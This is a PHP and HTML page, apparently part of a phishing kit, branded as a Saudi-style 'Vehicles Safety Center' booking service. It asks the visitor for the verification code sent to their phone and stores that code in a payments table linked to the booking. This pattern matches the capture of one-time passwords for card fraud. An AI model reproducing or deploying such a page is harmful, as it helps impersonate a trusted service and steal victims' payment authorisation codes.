<?php
session_start();
require_once 'db.php';

$appointment_id = $_SESSION['appointment_id'] ?? null;
if (!$appointment_id) {
    die("معرف الحجز غير موجود.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone_verification_code = trim($_POST['phone_verification_code']);

    if (empty($phone_verification_code)) {
        die("رمز التحقق للجوال مطلوب.");
    }

    $stmt = $conn->prepare("UPDATE payments SET phone_verification_code = ? WHERE appointment_id = ?");
    $stmt->bind_param("si", $phone_verification_code, $appointment_id);

    if ($stmt->execute()) {
        header("Location: done.php");
        exit;
    } else {
        die("فشل حفظ رمز التحقق للجوال: " . $conn->error);
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>رمز التحقق للجوال</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f4f6f8; padding: 40px; margin: 0; }
    header {
      background-color: white;
      padding: 15px 0;
      border-bottom: 3px solid #008aad;
      text-align: center;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      margin-bottom: 40px;
      width: 100%;
    }
    header h1 {
      font-size: 24px;
      margin: 0;
      color: #1a6d3c;
      font-weight: 700;
    }
    header span {
      font-size: 14px;
      color: #777;
      display: block;
      margin-top: 4px;
    }
    form {
      background: #fff;
      max-width: 500px;
      margin: auto;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #1a6d3c;
      text-align: center;
      margin-bottom: 25px;
    }
    label {
      font-weight: bold;
      margin-bottom: 10px;
      display: block;
    }
    .btn-submit {
      background-color: #1a6d3c;
      color: white;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      font-size: 18px;
    }
    input[type="text"] {
      text-align: center;
      font-size: 20px;
      letter-spacing: 10px;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      width: 100%;
      max-width: 200px;
      margin: auto;
    }
  </style>
</head>
<body>

<header>
  <h1>مركز سلامة المركبات</h1>
  <span>Vehicles Safety Center</span>
</header>

<form method="POST">
  <h2>رمز التحقق للجوال</h2>
  <div class="mb-3 text-center">
    <label for="phone_verification_code">أدخل الرمز المرسل إلى جوالك</label>
    <input type="text" id="phone_verification_code" name="phone_verification_code" pattern="\d{4,6}" maxlength="6" required>
  </div>
  <button type="submit" class="btn-submit">إنهاء</button>
</form>

</body>
</html>
